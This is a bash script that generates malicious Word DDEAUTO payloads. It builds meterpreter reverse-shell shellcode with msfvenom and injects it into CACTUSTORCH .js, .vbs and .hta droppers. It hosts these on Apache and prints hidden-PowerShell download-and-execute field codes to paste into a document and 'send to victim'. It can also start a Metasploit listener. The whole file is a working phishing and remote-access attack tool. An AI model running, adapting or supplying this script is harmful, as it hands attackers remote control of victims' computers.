#!/bin/bash

internal="$(ip route get 8.8.8.8 | awk '{print $NF;exit}')"
external="$(dig +short myip.opendns.com @resolver1.opendns.com)"

echo -e "\e[93m   ___   _   ___ _____ _   _ ___ _____ ___  ___  ___ _  _ "
echo -e "\e[93m  / __| /_\ / __|_   _| | | / __|_   _/ _ \| _ \/ __| || |"
echo -e "\e[33m | (__ / _ \ (__  | | | |_| \__ \ | || (_) |   / (__| __ |"
echo -e "\e[91m  \___/_/ \_\___| |_|  \___/|___/ |_| \___/|_|_\\\\\___|_||_|"
echo -e "\e[96m            |   \|   \| __| /_\| | | |_   _/ _ \          "
echo -e "            | |) | |) | _| / _ \ |_| | | || (_) |         "
echo -e "            |___/|___/|___/_/ \_\___/  |_| \___/ "
echo -e "\t\e[1;93m-= OFFICE DDEAUTO Payload Generation script =-"
echo -e "\t\t\033[1;32mScript Author: illwill (@xillwillx)"
echo -e "\t\033[1;32m  CACTUSTORCH Author: Vincent Yiu (@vysecurity)"
echo ""

echo -e "\e[93mWhich IP you want to use?\e[0m"
options=(
    "Internal IP: $internal"
    "External IP: $external"
    "Manual IP"
    )
select option in "${options[@]}"
do
    case "$REPLY" in
        1) echo -e "\e[32m[+]\e[0m Internal IP: $internal was selected."
           ip=$internal
			break ;;
        2) echo -e "\e[32m[+]\e[0m External IP: $external was selected." 
           ip=$external
			break ;;
        3) echo -e "Enter the IP Manually."
           read input;
           ip=$input
           echo  -e "\e[32m[+]\e[0mManual IP: $ip was selected.\033[0;0m"
			break ;;
        *) echo "Please select a valid option" ;;
    esac
done

echo ""
echo -e "\e[93mWhich PORT you want to use?\033[0;0m"
options=(
    "4444 (default)"
    "Manual Port"
    )
select option in "${options[@]}"
do
    case "$REPLY" in
        1) echo "Default: 4444"
		   port='4444'
		   echo -e "\e[32m[+]\e[0mDefault port: $port was entered."
			break ;;
        2) echo "Enter the port Manually."
           read input;
           port=$input
           echo -e "\e[32m[+]\e[0mManual port: $port was entered."
			break ;;
        *) echo "Please select a valid option" ;;
    esac
done

echo ""
echo -e "\e[32m[?]\e[0mChecking for CACTUSTORCH folder in current directory"
if [ -d "CACTUSTORCH" ] ; then
echo -e "\e[32m[+]\e[0mCACTUSTORCH folder found."
cd CACTUSTORCH
else
echo -e "\e[96m[+]\e[0mCACTUSTORCH folder not found, git'ing it"
git clone https://github.com/mdsecactivebreach/CACTUSTORCH.git && cd CACTUSTORCH
fi

echo ""
echo -e "\e[93mWhich payload you want to use?\033[0;0m"
options=(
    "windows/meterpreter/reverse_http"
    "windows/meterpreter/reverse_https"
    "windows/meterpreter/reverse_tcp"
    )
select option in "${options[@]}"
do
    case "$REPLY" in
        1) payload="windows/meterpreter/reverse_http"
		   echo -e "\e[32m[+]\e[0m$payload was selected."
			break ;;
        2) payload="windows/meterpreter/reverse_https" 
		   echo -e "\e[32m[+]\e[0m$payload was selected."
			break ;;
        3) payload="windows/meterpreter/reverse_tcp"
		   echo -e "\e[32m[+]\e[0m$payload was selected."
			break ;;
        *) echo "Please select a valid option" ;;
    esac
done

echo ""
echo -e "\e[32m[+]\e[0mCreating meterpreter shellcode with msfvenom"
msfvenom -p $payload LHOST=$ip LPORT=$port -f raw -o payload.bin


if [ -f "payload.bin" ] ; then
	echo -e "\e[32m[+]\e[0mpayload.bin created."
else
	echo -e "\e[96m[-]\e[0mpayload.bin not found, exiting..."
	exit 1
fi


echo -e "\e[32m[+]\e[0mGenerating base64 of payload.bin and injecting into the CACTUSTORCH .vbs/.hta/.js files"
PAYLOAD=$(cat payload.bin | base64 -w 0)
sed -i -e 's|var code = ".*|var code = "'$PAYLOAD'";|' CACTUSTORCH.js
sed -i -e 's|Dim code : code = ".*|Dim code : code = "'$PAYLOAD'"|g' CACTUSTORCH.vbs
sed -i -e 's|Dim code : code = ".*|Dim code : code = "'$PAYLOAD'"|g' CACTUSTORCH.hta
echo -e "\e[32m[+]\e[0mFiles edited. copying them to www folder"
cp -t /var/www/html/ CACTUSTORCH.vbs CACTUSTORCH.js CACTUSTORCH.hta
echo -e "\e[32m[+]\e[0mStarting Apache..."


read -r -p "Do You want to start Apache [y/N] " response
case "$response" in
    [yY][eE][sS]|[yY]) 
	echo -e "\e[32m[+]\e[0mStarting Apache..."
        service apache2 start
        ;;
    *)
	echo -e "\e[96m[-]\e[0mSkipping Apache..."
        ;;
esac




echo -e "\n\n\n\n\e[91mOpen Microsoft Word and press CTRL+F9 and copy any of the payloads below in between the { } then save and send to victim.\n\n\e[93mJS PAYLOAD:\e[0m\n\
DDEAUTO c:\\\\\Windows\\\\\System32\\\\\\\cmd.exe \"/k powershell.exe -w hidden -nop -ep bypass -Command" \(new-object System.Net.WebClient\).DownloadFile\(\'http:\/\/$IP\/CACTUSTORCH.js\',\'index.js\'\)\; \& start c:\\\\\\Windows\\\\\\\System32\\\\\\\\cmd.exe \/c cscript.exe index.js\" >payloads.txt
echo -e "\n\e[93mVBS PAYLOAD:\e[0m\n\
DDEAUTO c:\\\\\Windows\\\\\System32\\\\\\\cmd.exe \"/k powershell.exe -w hidden -nop -ep bypass -Command" \(new-object System.Net.WebClient\).DownloadFile\(\'http:\/\/$IP\/CACTUSTORCH.vbs\',\'index.vbs\'\)\; \& start c:\\\\\\Windows\\\\\\\System32\\\\\\\\cmd.exe \/c cscript.exe index.vbs\" >>payloads.txt
echo -e "\n\e[93mHTA PAYLOAD:\e[0m\n\
DDEAUTO C:\\\\\Programs\\\\\Microsoft\\\\\Office\\\\\MSword.exe\\\\\..\\\\\..\\\\\..\\\\\..\\\\\windows\\\\\system32\\\\\mshta.exe \"http://$IP/CACTUSTORCH.hta\"" >>payloads.txt
clear 
cat payloads.txt && rm payloads.txt
echo ""
read -r -p "Do You want to start meterpreter handler now? [y/N] " response
case "$response" in
    [yY][eE][sS]|[yY]) 
	echo -e "\e[32m[+]\e[0mStarting Meterpreter Handler..."
        msfconsole -qx "use exploit/multi/handler;set payload '$payload';set LHOST '$ip';set LPORT '$port'; set ExitOnSession false; set EnableStageEncoding true; exploit -j -z"
        ;;
    *)
	echo -e "\e[96m[-]\e[0mSkipping meterpreter handler..."
        ;;
esac
